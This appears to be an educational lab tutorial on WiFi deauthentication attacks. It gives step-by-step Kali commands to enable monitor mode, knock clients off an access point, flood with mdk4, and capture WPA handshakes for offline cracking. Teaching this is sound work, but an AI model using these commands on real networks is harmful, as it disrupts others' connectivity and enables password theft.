# WiFi Deauthentication Attack — Educational Lab Guide

> ⚠️ **LEGAL DISCLAIMER**  
> This guide is strictly for **educational purposes** and **authorized penetration testing only**.  
> Performing deauthentication attacks on any network **without explicit written permission** from the owner is **illegal** under:
> - India: IT Act 2000, Section 43 & 66
> - USA: Computer Fraud and Abuse Act (CFAA)
> - EU: Directive 2013/40/EU
> - Most other jurisdictions worldwide
>
> **Only test on networks you own or have written authorization to test.**  
> The author is not responsible for any misuse.

---

## Overview

This guide demonstrates how 802.11 deauthentication attacks work using Kali Linux default tools.  
**Use case:** Wireless penetration testing, WPA handshake capture in authorized lab environments.

**What is a Deauth Attack?**  
The 802.11 standard allows access points to send deauthentication frames to disconnect clients.  
These frames are **unauthenticated by design** — a known protocol-level weakness (CVE-2019-16275 relates to this class of issue). Attackers can spoof these frames to forcibly disconnect clients.

---

## Prerequisites

- Kali Linux (tested on 2023.x+)
- Wireless adapter that supports **monitor mode** and **packet injection**
  - Recommended: Alfa AWUS036ACH, TP-Link TL-WN722N v1
- **Written authorization** from the network owner
- A dedicated **lab environment** (your own router + devices)

---

## Tools Used

| Tool | Purpose | Kali Default? |
|------|---------|--------------|
| `airmon-ng` | Enable/disable monitor mode | ✅ |
| `airodump-ng` | Scan APs and clients | ✅ |
| `aireplay-ng` | Send deauth packets | ✅ |
| `mdk4` | Advanced deauth / beacon flood | ✅ |

---

## Step 1 — Enable Monitor Mode

```bash
# Check available interfaces
iwconfig

# Kill interfering processes (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill

# Enable monitor mode — creates wlan0mon (or similar)
sudo airmon-ng start wlan0
```

> **What to change:** Replace `wlan0` with your actual interface name from `iwconfig` output.

---

## Step 2 — Scan for Targets

```bash
# Scan nearby APs and connected clients (run 10–15 seconds, then Ctrl+C)
sudo airodump-ng wlan0mon
```

**Note the following from output:**

| Column | Meaning |
|--------|---------|
| `BSSID` | Access Point MAC address |
| `CH` | Channel the AP is on |
| `ESSID` | Network name (SSID) |
| `STATION` | Connected client MAC addresses |

> **What to change:** Replace `wlan0mon` with your monitor interface name.

---

## Step 3 — Launch the Deauth Attack

### Option A — Deauth ALL clients from a specific AP (broadcast)

```bash
# -0 = deauth mode | 5 = packet count | -a = AP BSSID
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

> Use `-0 0` for continuous deauth (runs until `Ctrl+C`).

---

### Option B — Deauth a SPECIFIC client

```bash
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

---

### Option C — Channel-locked precision attack

```bash
# Terminal 1: Lock to target channel and capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Terminal 2: Send deauth packets
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

> **What to change:**  
> - `AA:BB:CC:DD:EE:FF` → your **authorized** AP's BSSID  
> - `11:22:33:44:55:66` → the client MAC you noted in Step 2  
> - `-c 6` → the AP's actual channel  
> - `wlan0mon` → your monitor interface

---

## Using `mdk4` (faster, more aggressive)

```bash
# Deauth specific AP
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF

# Deauth a specific client from a specific AP
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -S 11:22:33:44:55:66
```

> `mdk4` is significantly faster than `aireplay-ng` for stress-testing in lab environments.

---

## WPA Handshake Capture (Common Pentest Objective)

A deauth forces clients to reconnect — triggering the 4-way WPA handshake, which can then be analyzed offline.

```bash
# Terminal 1: Capture traffic (locks to target channel)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Terminal 2: Deauth client to force reconnection
sudo aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

Handshake is saved in `handshake-01.cap` — used with `aircrack-ng` or `hashcat` for offline analysis.

---

## Cleanup After Testing

```bash
# Restore managed mode and restart network services
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
sudo systemctl start wpa_supplicant
```

---

## Reference: Values to Replace

| Placeholder | Replace With |
|-------------|-------------|
| `wlan0` | Your wireless interface from `iwconfig` |
| `wlan0mon` | Monitor mode interface (created by `airmon-ng`) |
| `AA:BB:CC:DD:EE:FF` | BSSID of your **authorized** target AP |
| `11:22:33:44:55:66` | MAC of target client from `airodump-ng` |
| `-c 6` | Actual channel of your target AP |

---

## Related Concepts to Study

- 802.11 frame types (management, control, data)
- WPA/WPA2 4-way handshake
- Management Frame Protection (802.11w) — the defense against this attack
- Wireless IDS/IPS detection

---
---

*For authorized lab use only. Always hack ethically.*
